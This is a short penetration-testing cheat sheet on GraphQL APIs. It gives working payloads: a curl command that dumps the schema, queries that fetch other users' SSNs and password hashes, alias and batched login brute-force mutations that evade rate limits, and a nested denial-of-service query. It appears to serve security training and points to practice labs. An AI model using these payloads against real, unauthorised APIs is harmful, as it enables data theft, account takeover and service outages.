# GraphQL Security

GraphQL APIs expose a single endpoint (often `/graphql`) with a schema describing all queries and mutations. Misconfigs lead to data leaks and auth bypass.

## Common vulnerabilities

- **Introspection enabled** - full schema visible to attackers
- **BOLA** - access other users' data via ID arguments in queries
- **Batching attacks** - bypass rate limits by bundling requests
- **Alias-based brute force** - multiple login attempts in one HTTP request
- **Deep recursion DoS** - nested queries crash the server

## Step 1 - Find and fingerprint the endpoint

```bash
# Common paths
/graphql  /graphql/console  /api/graphql  /v1/graphql  /graphiql

graphw00f -t https://target.com/graphql     # identify the engine (Apollo, Hasura...)
```

## Step 2 - Introspection (dump the whole schema)

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

If introspection is on, load the schema into **InQL** or GraphQL Voyager to see every query/mutation. If it's off, brute-force field names with **clairvoyance**.

## Step 3 - Attack the queries/mutations

```graphql
# BOLA - request another user's object by id
query { user(id: "1002") { email ssn } }

# Excessive data - ask for fields the UI never shows
query { me { id email passwordHash isAdmin } }

# Alias-based brute force (many attempts in ONE request -> bypass rate limit)
mutation {
  a: login(user:"admin", pass:"pass1") { token }
  b: login(user:"admin", pass:"pass2") { token }
  c: login(user:"admin", pass:"pass3") { token }
}
```

```json
// Batching attack - array of operations in one HTTP request
[ {"query":"mutation{login(user:\"a\",pass:\"1\"){token}}"},
  {"query":"mutation{login(user:\"a\",pass:\"2\"){token}}"} ]
```

```graphql
# Deep recursion DoS - nested relationships blow up the resolver
query { posts { author { posts { author { posts { id } } } } } }
```

## Tools

| Tool | Use |
|------|-----|
| [InQL](https://github.com/doyensec/inql) | Burp extension for GraphQL |
| [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) | Automated interaction |
| [BatchQL](https://github.com/assetnote/batchql) | Batching and alias attacks |
| [graphql-cop](https://github.com/nicholasaleks/graphql-cop) | Security audit |

## Practice

- [DVGA - Damn Vulnerable GraphQL Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)
- PortSwigger Web Security Academy - GraphQL labs

## Related

- [REST API Testing](REST%20API%20Testing.md)
